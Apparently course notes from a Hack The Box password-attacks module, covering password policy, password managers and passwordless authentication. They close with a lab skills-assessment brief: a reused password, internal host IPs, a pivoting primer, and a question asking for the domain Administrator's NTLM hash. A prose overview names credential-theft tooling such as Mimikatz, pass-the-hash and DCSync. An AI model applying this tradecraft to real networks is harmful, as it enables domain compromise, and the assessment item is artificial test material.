+Many companies follow established IT security standards for compliance and best practice. Adhering to them defines a security baseline but doesn't guarantee full security, and compliance alone shouldn't be the only measure of security controls. Common standards with password guidance:
+
+- NIST SP800-63B
+- CIS Password Policy Guide
+- PCI DSS
+
+These differ on key points — password expiration being a notable example. The old advice of "change your password every 90 days" has shifted: the industry now often recommends disabling password expiration, since forced changes push users toward predictable, weak patterns.
+
+## Sample password policy
+
+An example policy requiring all passwords to:
+
+- Be a minimum of 8 characters
+- Include uppercase and lowercase letters
+- Include at least one number
+- Include at least one special character
+- Not be the username
+- Be changed every 60 days
+
+Mark now picks Inlanefreight01!, which passes — but it's still weak because it contains the company name (a common, attacker-known pattern from the "Password Mutations" section). At expiration, he can just change 01 to 02 and still comply, which is why the effectiveness of expiration policies is debated.
+
+Policies should therefore blacklist certain words, including: the company name, common words associated with the company, month names, season names, variations of "welcome" and "password", and easily guessable strings like password, 123456, abcde.
+
+## Enforcing password policy
+
+A policy must be enforced using available technology (or by acquiring the right tools). Most applications and identity management systems support enforcement — for example, with Active Directory you can configure an Active Directory Password Policy GPO. Once the technical side is covered, the policy must be communicated across the company, with processes and procedures to ensure it's applied everywhere.
+
+## Creating a strong password
+
+Strong passwords don't have to be hard. Tools like PasswordMonster evaluate password strength, and the 1Password Password Generator creates secure ones. A generated password like `CjDC2x[U` is strong and resistant to guessing/spraying, but hard to remember.
+
+An alternative is using ordinary words, phrases, or song lyrics — e.g. `The name of my dog is Popy` — optionally with added special characters like `()The name of my dog is Popy!`. These are hard to guess yet memorable, though you should stay aware that attackers use OSINT to learn personal details. This method works for a few passwords, but as they multiply it becomes hard to manage them all — which leads into the next topic: password managers.
+
+# Password Managers
+
+Passwords are everywhere -- Wi-Fi, social media, banking, email, apps. A NordPass study found the average person has around 100 passwords, which drives people to reuse them or make them too simple. The realistic solution is a password manager: an app that stores passwords and sensitive info in an encrypted database. Beyond storage, they offer password generation, 2FA support, secure from filling, browser integration, multi-device sync, security alerts, and more.
+
+## How does a password manager work?
+
+Implementations vary by provider, but most use a master password to encrypt the database. Encryption and authentication rely on cryptographic hash functions and key derivation functions to prevent unauthorized access. The exact mechanisms depend on the provider and whether the manager is cloud-based or local.
+
+## Cloud password managers
+
+Since the average person has three or four devices, a cloud-based manager syncs the encrypted database across all of them, typically providing a mobile app and a browser add-on. Each vendor implements security differently and usually publishes a technical whitepaper (e.g. Bitwarden, 1Password, LastPass).
+
+A common design derives encryption keys from the master password, enabling Zero-Knowledge Encryption -- meaning not even the provider can access your data. Using Bitwarden as the example:
+
+- Master key: derived from the master password via a key derivation function. 
+- Master password hash: generated from the master password (often plus the master key) to authenticate the user to the cloud service.
+- Decryption key: created from the master key to forma symmetric key, used to decrypt vault items.
+
+(Bitwarden uses PBKDF2-SHA256 for derivation and AES-256 for decryption.) This is simplified — real implementations are more complex. Popular cloud managers: 1Password, Bitwarden, Dashlane, Keeper, LastPass, NordPass, RoboForm.
+
+## Local password managers
+
+Some prefer not to rely on third parties and instead store the database locally, taking on responsibility for protecting it. (Dashlane's "Cloud vs. Local" blog post is a useful starting point — noting that local isn't automatically more secure, since cybersecurity isn't that simple.)
+
+Local managers use similar encryption to cloud ones; the main difference is in data transmission and authentication. They focus on securing the locally stored database with cryptographic hash functions and key derivation functions with random salt (to block precomputed keys and hinder dictionary/guessing attacks). Some add memory protection and keylogger resistance via a secure desktop environment, similar to Windows UAC. Popular local managers: KeePass, KWalletManager, Pleasant Password Server, Password Safe.
+
+## Features
+
+To pick the right manager, match features to your needs (e.g. Linux/Android/Chrome OS, sync across devices, 2FA, a $5/month budget). Wikipedia lists online and offline managers with their capabilities. Common features:
+
+- 2FA support
+- Multi-platform (Android, iOS, Windows, Linux, Mac, etc.)
+- Browser extension
+- Login autocomplete
+- Import and export
+- Password generation
+
+
+
+## Alternatives
+
+Passwords are the most common authentication method but not the only one — and they're vulnerable to cracking, guessing, shoulder surfing, and more. Most OSes and apps default to passwords, but admins can adopt third-party identity providers to strengthen protection. Common alternatives:
+
+- Multi-factor Authentication (MFA)
+- FIDO2 — an open standard for passwordless logins using physical devices like a YubiKey
+- One-Time Passwords (OTP)
+- Time-Based One-Time Passwords (TOTP)
+- IP restrictions
+- Device compliance enforcement via tools like Microsoft Endpoint Manager or - Workspace ONE
+
+
+
+## Going passwordless
+
+Companies like Microsoft, Auth0, Okta, and Ping Identity are pushing for a passwordless future. A password is a knowledge factor (something you know), which is vulnerable to theft, sharing, reuse, and misuse. Passwordless authentication replaces it with a possession factor (something you have) or an inherent factor (something you are), verifying identity with greater assurance. As these standards evolve, it's worth understanding their implementation details to judge whether they meet your security needs.
+
+There are many options for protecting passwords; the right choice depends on the individual or organization's needs, and it's common to use different methods for different purposes.
+
+# Skills Assessment
+## The Credential Theft Shuffle
+The Credential Theft Shuffle, as coined by Sean Metcalf, is a systematic approach attackers use to compromise Active Directory environments by exploiting stolen credentials. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to move laterally across the network. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and gain control over the domain, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the Local Administrator Password Solution (LAPS), enforcing multi-factor authentication, and restricting administrative privileges to mitigate such attacks.
+
+## Skills Assessment
+Betty Jayde works at Nexura LLC. We know she uses the password Texas123!@# on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:
+
+
+| Host     | IP Address                                                  |
+| -------- | ----------------------------------------------------------- |
+| `DMZ01`  | `10.129.*.*` **(External)**, `172.16.119.13` **(Internal)** |
+| `JUMP01` | `172.16.119.7`                                              |
+| `FILE01` | `172.16.119.10`                                             |
+| `DC01`   | `172.16.119.11`                                             |
+
+
+### Pivoting Primer
+The internal hosts (JUMP01, FILE01, DC01) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is DMZ01, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.
+
+To access these internal systems, we must first gain a foothold on DMZ01. From there, we can pivot — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module cheatsheet for the necessary commands to set up the pivot and continue your assessment.
+
+## Connect to HTB
+#### What is the NTLM hash of NEXURA\Administrator?
